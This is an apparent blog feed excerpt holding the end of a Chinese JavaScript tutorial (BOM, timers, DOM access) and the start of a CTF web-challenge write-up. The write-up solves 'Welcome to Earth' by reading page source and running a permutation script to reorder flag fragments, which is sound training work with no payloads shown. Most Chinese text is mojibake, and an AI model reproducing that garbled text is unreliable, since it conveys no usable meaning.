src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001751547.png" alt="image-20220408001751547"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001220640.png" alt="image-20220408001220640"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001232044.png" alt="image-20220408001232044"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001300510.png" alt="image-20220408001300510"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001325030.png" alt="image-20220408001325030"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001357820.png" alt="image-20220408001357820"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001425680.png" alt="image-20220408001425680"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001432558.png" alt="image-20220408001432558"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001456688.png" alt="image-20220408001456688"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001513319.png" alt="image-20220408001513319"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001558293.png" alt="image-20220408001558293"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001728712.png" alt="image-20220408001728712"></p><h1 id="æ•°å­—å¸¸ç”¨æ–¹æ³•"><a href="#æ•°å­—å¸¸ç”¨æ–¹æ³•" class="headerlink" title="æ•°å­—å¸¸ç”¨æ–¹æ³•"></a>æ•°å­—å¸¸ç”¨æ–¹æ³•</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002711294.png" alt="image-20220408002711294"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001857190.png" alt="image-20220408001857190"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001921068.png" alt="image-20220408001921068"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001959789.png" alt="image-20220408001959789"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002017326.png" alt="image-20220408002017326"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002033918.png" alt="image-20220408002033918"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002053540.png" alt="image-20220408002053540"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002112036.png" alt="image-20220408002112036"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002122229.png" alt="image-20220408002122229"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002133196.png" alt="image-20220408002133196"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002147147.png" alt="image-20220408002147147"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002152859.png" alt="image-20220408002152859"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002208364.png" alt="image-20220408002208364"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002217762.png" alt="image-20220408002217762"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002233052.png" alt="image-20220408002233052"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002257196.png" alt="image-20220408002257196"></p><h1 id="æ—¶é—´å¸¸ç”¨æ–¹æ³•"><a href="#æ—¶é—´å¸¸ç”¨æ–¹æ³•" class="headerlink" title="æ—¶é—´å¸¸ç”¨æ–¹æ³•"></a>æ—¶é—´å¸¸ç”¨æ–¹æ³•</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002836962.png" alt="image-20220408002836962"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002855807.png" alt="image-20220408002855807"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003002403.png" alt="image-20220408003002403"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003019626.png" alt="image-20220408003019626"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003107445.png" alt="image-20220408003107445"></p><h1 id="JavaScriptçš„BOMæ“ä½œ"><a href="#JavaScriptçš„BOMæ“ä½œ" class="headerlink" title="JavaScriptçš„BOMæ“ä½œ"></a>JavaScriptçš„BOMæ“ä½œ</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410161902503.png" alt="image-20220410161902503"></p><p><strong>1ã€è·å–æµè§ˆå™¨çª—å£å°ºå¯¸</strong></p><pre><code>è·å–å¯è§†çª—å£å®½åº¦: window.innerWidthè·å–å¯è§†çª—å£é«˜åº¦: window.innerHeight</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410162216868.png" alt="image-20220410162216868"></p><p><strong>2ã€æµè§ˆå™¨çš„å¼¹å‡ºå±‚</strong></p><pre><code>æç¤ºæ¡†: window.alert(&#39;æç¤ºä¿¡æ¯&#39;)è¯¢é—®æ¡†: window.confirm(&#39;æç¤ºä¿¡æ¯&#39;) è¿”å› trueå’Œfalseè¾“å…¥æ¡†: window.prompt(&#39;æç¤ºä¿¡æ¯&#39;) ç‚¹ç¡®å®šï¼Œè¿”å›è¾“å…¥æ¡†ä¸­å†…å®¹ï¼Œç‚¹å–æ¶ˆè¿”å›null</code></pre><p><strong>3ã€å¼€å¯å’Œå…³é—­æ ‡ç­¾é¡µ</strong></p><pre><code>å¼€å¯: window.open(&#39;åœ°å€&#39;)å…³é—­: window.close()</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410162721520.png" alt="image-20220410162721520"></p><p><strong>4ã€æµè§ˆå™¨å¸¸è§äº‹ä»¶</strong></p><pre><code>èµ„æºåŠ è½½å®Œæ¯•: window.onload = function() &#123;&#125;å¯è§†å°ºå¯¸æ”¹å˜: window.onresize = function()&#123;&#125;æ»šåŠ¨æ¡ä½ç½®æ”¹å˜: window.onscroll = function()&#123;&#125;</code></pre><ol><li>åœ¨é¡µé¢èµ„æºåŠ è½½å®Œæ¯•æ‰§è¡Œ</li></ol><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163103734.png" alt="image-20220410163103734"></p><ol start="2"><li><p>å¯è§†çª—å£å‘ç”Ÿå˜åŒ–æ—¶æ‰§è¡Œ</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163226827.png" alt="image-20220410163226827"></p></li><li><p>æ»šåŠ¨æ¡ä½ç½®æ”¹å˜æ—¶æ‰§è¡Œ</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163327867.png" alt="image-20220410163327867"></p></li></ol><p><strong>5ã€æµè§ˆå™¨å†å²è®°å½•æ“ä½œ</strong></p><pre><code>å›é€€é¡µé¢:window.history.back()å‰è¿›é¡µé¢: window.history.forward</code></pre><p><strong>6ã€æµè§ˆå™¨å·å»å°ºå¯¸</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163708715.png" alt="image-20220410163708715"></p><ol><li><p>å·å»çš„é«˜åº¦</p><pre><code>document.documentElement.scrollTop #å½“æœ‰&lt;!DOCTYPE html&gt;ç”¨è¿™ä¸ªdocument.body.scrollTop #å½“æ²¡æœ‰&lt;!DOCTYPE html&gt;ç”¨è¿™ä¸ª</code></pre><p>å…¼å®¹å†™æ³•</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164045152.png" alt="image-20220410164045152"></p></li><li><p>å·å»å®½åº¦</p><pre><code>document.documentElement.scrollleft #å½“æœ‰&lt;!DOCTYPE html&gt;ç”¨è¿™ä¸ªdocument.body.scrollleft #å½“æ²¡æœ‰&lt;!DOCTYPE html&gt;ç”¨è¿™ä¸ª</code></pre><p>å…¼å®¹å†™æ³•:</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164228039.png" alt="image-20220410164228039"></p></li></ol><p><strong>7ã€æµè§ˆå™¨æ»šåŠ¨åˆ°</strong></p><pre><code>window.scrolloTo()  #æ»šåŠ¨åˆ°å‚æ•°æ–¹å¼1(ç¬é—´å®šä½): window.scrollTo(left,top)        left:æµè§ˆå™¨å·å»é«˜åº¦        top:æµè§ˆå™¨å·å»é«˜åº¦å‚æ•°æ–¹å¼2(æ»šåŠ¨å®šä½): window.scrollTo(&#123;        left: xx        top: yy        behavior:&#39;smooth&#39;  #è¡¨ç¤ºå¹³æ»‘æ»šåŠ¨&#125;)</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164500900.png" alt="image-20220410164500900"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164841389.png" alt="image-20220410164841389"></p><h1 id="JavaScriptå®šæ—¶å™¨"><a href="#JavaScriptå®šæ—¶å™¨" class="headerlink" title="JavaScriptå®šæ—¶å™¨"></a>JavaScriptå®šæ—¶å™¨</h1><p><strong>é—´éš”å®šæ—¶å™¨</strong></p><pre><code>æŒ‰ç…§æŒ‡å®šå‘¨æœŸ(æ¯«ç§’)å»æ‰§è¡ŒæŒ‡å®šçš„ä»£ç è¯­æ³•: setInterval(å‡½æ•°,æ—¶é—´)å‡½æ•°: æ¯æ¬¡è¦æ‰§è¡Œçš„å†…å®¹æ—¶é—´: å•ä½æ˜¯æ¯«ç§’</code></pre><p>ç¤ºä¾‹ä»£ç </p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;sakura&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            setInterval(function()&#123;                console.log(&#39;æ‰§è¡Œä¸€æ¬¡&#39;)            &#125;,1000)  # å•ä½æ¯«ç§’ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯1ç§’        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411122709604.png" alt="image-20220411122709604"></p><p>å»¶æ—¶å®šæ—¶å™¨</p><pre><code>åœ¨å›ºå®šçš„æ—¶é—´(æ¯«ç§’)åæŒ‡å®šä¸€æ¬¡ä»£ç è¯­æ³•: setTimeout(å‡½æ•°,æ—¶é—´)å‡½æ•°: æ—¶é—´åˆ°è¾¾æ‰§è¡Œçš„å†…å®¹æ—¶é—´: å•ä½æ˜¯æ¯«ç§’</code></pre><p>ç¤ºä¾‹ä»£ç </p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;sakura&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            setTimeout(function()&#123;                console.log(&#39;æ‰§è¡Œä¸€æ¬¡&#39;)            &#125;,1000)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411122948862.png" alt="image-20220411122948862"></p><p><strong>å®šæ—¶å™¨è¿”å›å€¼</strong></p><pre><code>ä¸åŒºåˆ†å®šæ—¶å™¨ç§ç±»è¡¨ç¤ºæ˜¯å½“å‰é¡µé¢çš„ç¬¬å‡ ä¸ªå®šæ—¶å™¨</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411123144526.png" alt="image-20220411123144526"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411123157829.png" alt="image-20220411123157829"></p><p>æ˜¯ä¸åŒºåˆ†ç§ç±»çš„ï¼Œåªè¡¨ç¤ºæ˜¯é¡µé¢ç¬¬å‡ ä¸ªå®šæ—¶å™¨</p><p><strong>å…³é—­å®šæ—¶å™¨</strong></p><pre><code>è¯­æ³•ä¸€: clearInterval(è¦å…³é—­çš„å®šæ—¶å™¨è¿”å›å€¼)è¯­æ³•äºŒ: clearTimeout(è¦å…³é—­çš„å®šæ—¶å™¨è¿”å›å€¼)è¿™æ˜¯ä¸åŒºåˆ†å®šæ—¶å™¨ç§ç±»çš„å¯ä»¥äº’ç›¸å…³é—­</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135402168.png" alt="image-20220411135402168"></p><h1 id="DOMåŸºæœ¬æ“ä½œ"><a href="#DOMåŸºæœ¬æ“ä½œ" class="headerlink" title="DOMåŸºæœ¬æ“ä½œ"></a>DOMåŸºæœ¬æ“ä½œ</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135516647.png" alt="image-20220411135516647"></p><p><strong>è·å–å…ƒç´ æ–¹å¼</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135606813.png" alt="image-20220411135606813"></p><ol><li><p>æ ¹æ®idåç§°è·å–</p><pre><code>è¯­æ³•: document.getElementById(&#39;idåç§°&#39;)ä½œç”¨: è·å–æ–‡æ¡£æµä¸­idåå¯¹åº”çš„ä¸€ä¸ªå…ƒç´ è¿”å›å€¼:    å¦‚æœæœ‰idå¯¹åº”çš„å…ƒç´ ï¼Œå°±æ˜¯è¿™ä¸ªå…ƒç´     å¦‚æœæ²¡æœ‰idå¯¹åº”çš„å…ƒç´ ï¼Œå°±æ˜¯null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411140343642.png" alt="image-20220411140343642"></p></li><li><p>æ ¹æ®å…ƒç´ ç±»åè·å–</p><pre><code>è¯­æ³•: document.getElementsByClassName(&#39;å…ƒç´ ç±»å&#39;)ä½œç”¨: è·å–æ–‡æ¡£æµä¸­æ‰€æœ‰ç±»åå¯¹åº”çš„å…ƒç´ è¿”å›å€¼: å¿…å®šæ˜¯ä¸€ä¸ªä¼ªæ•°ç»„    å¦‚æœæœ‰ç±»åå¯¹åº”çš„å…ƒç´ ï¼Œæœ‰å¤šå°‘è·å–å¤šå°‘    å¦‚æœæ²¡ç”¨ç±»åå¯¹åº”çš„å…ƒç´ ï¼Œç©ºçš„ä¼ªæ•°ç»„</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411141050751.png" alt="image-20220411141050751"></p></li><li><p>æ ¹æ®å…ƒç´ æ ‡ç­¾åè·å–</p><pre><code>è¯­æ³•: document.getElementsByTagName(&#39;æ ‡ç­¾å&#39;)ä½œç”¨ï¼› è·å–æ–‡æ¡£æµä¸­æ‰€æœ‰æ ‡ç­¾åå¯¹åº”çš„å…ƒç´ è¿”å›å€¼ï¼›å¿…ç„¶æ˜¯ä¸€ä¸ªä¼ªæ•°ç»„    å¦‚æœæœ‰æ ‡ç­¾åå¯¹åº”çš„å…ƒç´ ï¼Œæœ‰å¤šå°‘è·å–å¤šå°‘    å¦‚æœæ²¡ç”¨æ ‡ç­¾åå¯¹åº”çš„å…ƒç´ ï¼Œç©ºçš„ä¼ªæ•°ç»„</code></pre><p> <img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411141947898.png" alt="image-20220411141947898"></p></li><li><p>æ ¹æ®é€‰æ‹©å™¨è·å–ä¸€ä¸ª</p><pre><code>è¯­æ³•ï¼› document.querySelector(&#39;é€‰æ‹©å™¨&#39;)ä½œç”¨: è·å–æ–‡æ¡£æµä¸­æ»¡è¶³é€‰æ‹©å™¨è§„åˆ™çš„ç¬¬ä¸€ä¸ªå…ƒç´ è¿”å›å€¼:    å¦‚æœæœ‰é€‰æ‹©å™¨å¯¹åº”çš„å…ƒç´ ï¼Œè·å–åˆ°ç¬¬ä¸€ä¸ª    å¦‚æœæ²¡ç”¨é€‰æ‹©å™¨å¯¹åº”çš„å…ƒç´ ï¼Œè¿”å›null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411142650050.png" alt="image-20220411142650050"></p></li><li><p>æ ¹æ®é€‰æ‹©å™¨è·å–ä¸€ç»„</p><pre><code>è¯­æ³•:document.querySelectorAll(&#39;é€‰æ‹©å™¨&#39;)ä½œç”¨: è·å–æ–‡æ¡£æµä¸­æ‰€æœ‰æ»¡è¶³é€‰æ‹©å™¨è§„åˆ™çš„å…ƒç´ è¿”å›å€¼: å¿…ç„¶æ˜¯ä¸€ä¸ªä¼ªæ•°ç»„    å¦‚æœæœ‰é€‰æ‹©å™¨å¯¹åº”çš„å…ƒç´ ï¼Œè·å–åˆ°ç¬¬ä¸€ä¸ª    å¦‚æœæ²¡ç”¨é€‰æ‹©å™¨å¯¹åº”çš„å…ƒç´ ï¼Œè¿”å›null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411143324177.png" alt="image-20220411143324177"></p></li></ol><p><strong>æ“ä½œå…ƒç´ å†…å®¹</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144452327.png" alt="image-20220411144452327"></p><ol><li><p>æ“ä½œå…ƒç´ æ–‡æœ¬å†…å®¹</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144426234.png" alt="image-20220411144426234"></p></li><li><p>æ“ä½œå…ƒç´ è¶…æ–‡æœ¬å†…å®¹</p></li></ol><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144816538.png" alt="image-20220411144816538"></p><p><strong>æ“ä½œå…ƒç´ å±æ€§</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411145038287.png" alt="image-20220411145038287"></p><ol><li><p>åŸç”Ÿå±æ€§</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411145906291.png" alt="image-20220411145906291"></p></li><li><p>è‡ªå®šä¹‰å±æ€§</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411150625140.png" alt="image-20220411150625140"></p></li></ol><p><strong>æ“ä½œå…ƒç´ ç±»å</strong></p><pre><code>è·å–: å…ƒç´ .classNameè®¾ç½®ï¼› å…ƒç´ .className = &#39;æ–°ç±»å&#39;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411151419501.png" alt="image-20220411151419501"></p><p><strong>æ“ä½œå…ƒç´ è¡Œå†…æ ·å¼</strong></p><pre><code>è·å–: å…ƒç´ .style.æ ·å¼åè®¾ç½®: å…ƒç´ .style.æ ·å¼å = &#39;æ ·å¼å€¼&#39;æ³¨æ„: åªèƒ½è·å–å’Œè®¾ç½®å…ƒç´ çš„è¡Œå†…æ ·å¼</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152231051.png" alt="image-20220411152231051"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152308257.png" alt="image-20220411152308257"></p><p><strong>è·å–å…ƒç´ éè¡Œå†…æ ·å¼</strong></p><pre><code>è·å–:window.getComputedStyle(å…ƒç´ ).æ ·å¼åæ³¨æ„ï¼› å¯ä»¥è·å–è¡Œå†…æ ·å¼ï¼Œä¹Ÿå¯ä»¥è·å–éè¡Œå†…æ ·å¼</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152807202.png" alt="image-20220411152807202"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¯¥æ¥çš„æ°¸è¿œè·‘ä¸æ‰ï¼Œè¯¥è¡¥çš„æ—©æ™šè¦è¡¥ï¼Œè¯¶ï¼Œå¥½å¥½å­¦javascriptï¼Œæˆ‘çˆ±å­¦ä¹ ï¼ï¼ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;å†å²&quot;&gt;&lt;a href=&quot;#å†å²&quot; class=&quot;headerlink&quot; title=&quot;å†å²&quot;&gt;&lt;/a&gt;å†å²&lt;/h1&gt;&lt;p&gt;&lt;img sr</summary>
      
    
    
    
    <category term="è¯­è¨€" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/"/>
    
    <category term="javascript" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/javascript/"/>
    
    
    <category term="javascript" scheme="https://sakurahack-y.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®</title>
    <link href="https://sakurahack-y.github.io/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/"/>
    <id>https://sakurahack-y.github.io/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/</id>
    <published>2022-03-28T12:25:15.000Z</published>
    <updated>2022-04-06T16:47:13.445Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="é¢˜ç›®åˆ—è¡¨"><a href="#é¢˜ç›®åˆ—è¡¨" class="headerlink" title="é¢˜ç›®åˆ—è¡¨"></a>é¢˜ç›®åˆ—è¡¨</h1><p><strong>Webæ–¹å‘ï¼š</strong></p><p>[b01lers2020]Welcome to Earth</p><p>[ç½‘é¼æ¯ 2018]Comment</p><p>[GYCTF2020]Ezsqli</p><p>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</p><p>[watevrCTF-2019]Cookie Store</p><p>[SWPUCTF 2018]SimplePHP</p><p>[WUSTCTF2020]CV Maker</p><p>[HarekazeCTF2019]encode_and_encode</p><p>[çº¢æ˜è°·CTF 2021]write_shell</p><p>[SUCTF 2019]EasyWeb</p><p>[RootersCTF2019]I_&lt;3_Flask</p><p>[NCTF2019]SQLi</p><p>[NPUCTF2020]ezinclude</p><p>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</p><h1 id="åˆ·é¢˜"><a href="#åˆ·é¢˜" class="headerlink" title="åˆ·é¢˜"></a>åˆ·é¢˜</h1><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>è¿›å»åï¼Œå®ƒä¼šç›´æ¥æç¤ºæˆ‘ï¼Œæˆ‘dieäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°å®ƒæœ‰ä¸ªä¸€é—ªè€Œè¿‡çš„ç”»é¢ã€‚</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203228318.png" alt="image-20220328203228318"></p><p>åœ¨è¿™ä¸ªé¡µé¢æ²¡æœ‰å‘ç°ï¼Œä½¿ç”¨burpæŠ“åŒ…</p><p>æŠ“åˆ°</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203639569.png" alt="image-20220328203639569"></p><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°äº†ä¸ªæœ‰è¶£çš„è·¯å¾„</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204251360.png" alt="image-20220328204251360"></p><p>ç»§ç»­ç”¨burpæŠ“åŒ…æ‰“å¼€</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204549649.png" alt="image-20220328204549649"></p><p>è¿™ä¸¤ä¸ªéƒ½ç‚¹å‡»åï¼Œæ²¡æœ‰æ•ˆæœ</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204655545.png" alt="image-20220328204655545"></p><p>æŸ¥çœ‹ä¸‹æºä»£ç ï¼Œå‘ç°ä¸€ä¸ªå¯ç–‘è·¯å¾„</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204718322.png" alt="image-20220328204718322"></p><p>è¿›å…¥åï¼Œç•Œé¢å¦‚ä¸‹</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204815035.png" alt="image-20220328204815035"></p><p>ç‚¹å‡»æŒ‰é’®ï¼Œåˆä¼šdie</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204844208.png" alt="image-20220328204844208"></p><p>ç»§ç»­æŸ¥çœ‹æºä»£ç ï¼Œæ— é™å¥—å¨ƒå‘—</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204931097.png" alt="image-20220328204931097"></p><p>è¿›å»</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205009037.png" alt="image-20220328205009037"></p><p>ç‚¹å‡»continue<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205120224.png" alt="image-20220328205120224"></p><p>è¦é€‰æ‹©ä¸€ä¸ªæ­£ç¡®çš„æ•°å­—ï¼Œä½†æ˜¯å¤ªå¤šäº†å§ï¼Œå…ˆçœ‹çœ‹æºä»£ç å§ï¼Œå‘ç°å¦‚ä¸‹jsä»£ç </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205425890.png" alt="image-20220328205425890"></p><p>å˜¿å˜¿ï¼Œä¸ç”¨ä¸€ä¸ªä¸ªè¯•äº†ï¼Œç›´æ¥åˆ°openç›®å½•</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205558332.png" alt="image-20220328205558332"></p><p>ç»§ç»­æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°fightç›®å½•</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205711090.png" alt="image-20220328205711090"></p><p>è¿›å…¥ï¼Œä¸€ä¸ªå¯æ€•çš„å¤–æ˜Ÿäºº</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205745540.png" alt="image-20220328205745540"></p><p>ç»§ç»­æŸ¥çœ‹æºä»£ç </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205854907.png" alt="image-20220328205854907"></p><p>å‘ç°flagçš„é¡ºåºè¢«æ‰“ç®—ï¼Œæƒ³è¦åè§£å‡½æ•°ä¸ç°å®ï¼Œå°è¯•å…¨æ’åˆ—</p><pre><code>itertools.permutations()ï¼šå°±æ˜¯è¿”å›å¯è¿­ä»£å¯¹è±¡çš„æ‰€æœ‰æ•°å­¦å…¨æ’åˆ—æ–¹å¼,å®ƒä»¥ä»»æ„è¿­ä»£ä½œä¸ºå‚æ•°ï¼Œå¹¶å§‹ç»ˆè¿”å›ç”Ÿæˆå…ƒç»„çš„è¿­ä»£å™¨ã€‚å®ƒæ²¡æœ‰(ä¹Ÿä¸åº”è¯¥)ç‰¹æ®Šçš„å­—ç¬¦ä¸²ã€‚è¦è·å¾—å­—ç¬¦ä¸²åˆ—è¡¨ï¼Œæ‚¨å¯ä»¥è‡ªå·±åŠ å…¥å…ƒç»„ï¼š list(map(&quot;&quot;.join, itertools.permutations(&#39;1234&#39;)))</code></pre><pre><code class="python">from itertools import permutationsflag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]item = permutations(flag)for i in item:    #print (i)    k=&quot;&quot;.join(i)    #print(k)    if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1]==&#39;&#125;&#39;:        print(k)</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328215044738.png" alt="image-20220328215044738"></p><p>æ‰¾åˆ°å¯èƒ½çš„flagï¼Œå°è¯•å³å¯</p><p>æœ€ç»ˆflagä¸º</p><pre><code>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</code></pre><h2 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 